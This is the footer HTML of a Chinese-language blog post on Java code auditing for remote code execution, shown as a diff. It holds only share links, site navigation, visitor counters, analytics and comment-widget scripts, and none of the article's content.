+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2022/09/25/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1(%E4%BA%8C)-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/&text=Java代码审计(二)-远程代码执行"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2022/09/25/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1(%E4%BA%8C)-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/&title=Java代码审计(二)-远程代码执行"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2022/09/25/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1(%E4%BA%8C)-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/&is_video=false&description=Java代码审计(二)-远程代码执行"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Java代码审计(二)-远程代码执行&body=Check out this article: http://example.com/2022/09/25/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1(%E4%BA%8C)-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2022/09/25/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1(%E4%BA%8C)-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/&title=Java代码审计(二)-远程代码执行"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2022/09/25/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1(%E4%BA%8C)-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/&title=Java代码审计(二)-远程代码执行"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2022/09/25/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1(%E4%BA%8C)-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/&title=Java代码审计(二)-远程代码执行"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2022/09/25/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1(%E4%BA%8C)-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/&title=Java代码审计(二)-远程代码执行"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2022/09/25/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1(%E4%BA%8C)-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/&name=Java代码审计(二)-远程代码执行&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2022/09/25/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1(%E4%BA%8C)-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/&t=Java代码审计(二)-远程代码执行"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+      <div class="footer-left">
+        Copyright &copy;
+        
+        
+        2022-2025
+        Funsiooo
+      </div>
+      <div class="footer-right">
+        <nav>
+          <ul>
+            <!--
+          --><li><a href="/">首页</a></li><!--
+        --><!--
+          --><li><a href="/archives/">归档</a></li><!--
+        --><!--
+          --><li><a href="/search/">搜索</a></li><!--
+        --><!--
+          --><li><a href="/tags/">标签</a></li><!--
+        --><!--
+          --><li><a href="/about/">关于</a></li><!--
+        -->
+          </ul>
+        </nav>        
+      </div>
+
+      <div class="footer-midle">
+        <nav>
+          <ul>
+            
+              <!-- 不蒜子统计 -->
+              <span id="busuanzi_container_site_pv">
+                  本站总访问量<span id="busuanzi_value_site_pv"></span>次
+              </span>
+              <span class="post-meta-divider">|</span>
+              <span id="busuanzi_container_site_uv" style='display:none'>
+                      本站访客数<span id="busuanzi_value_site_uv"></span>人
+              </span>
+              <span id="busuanzi_container_page_pv">
+			  本文总阅读量<span id="busuanzi_value_page_pv"></span>次
+	      </span>
+            <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+            
+          </ul>
+        </nav>
+      </div>
+</footer>
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+ 
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板！\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功！");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+  <script type="text/javascript">
+        var _hmt = _hmt || [];
+        (function() {
+          var hm = document.createElement("script");
+          hm.src = "https://hm.baidu.com/hm.js?47a5bc2b41144f91553c5eefd4999c0d";
+          var s = document.getElementsByTagName("script")[0];
+          s.parentNode.insertBefore(hm, s);
+        })();
+        </script>
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+    <script type="text/javascript">
+        var disqus_shortname = 'boom';
+
+        (function(){
+            var dsq = document.createElement('script');
+            dsq.type = 'text/javascript';
+            dsq.async = true;
+            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        }());
+    </script>
+
+<!-- utterances Comments -->
+
+<!-- FancyBox -->
+
+<script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@4.0/dist/fancybox.umd.js"></script>
+
+
+</body>
+</html>
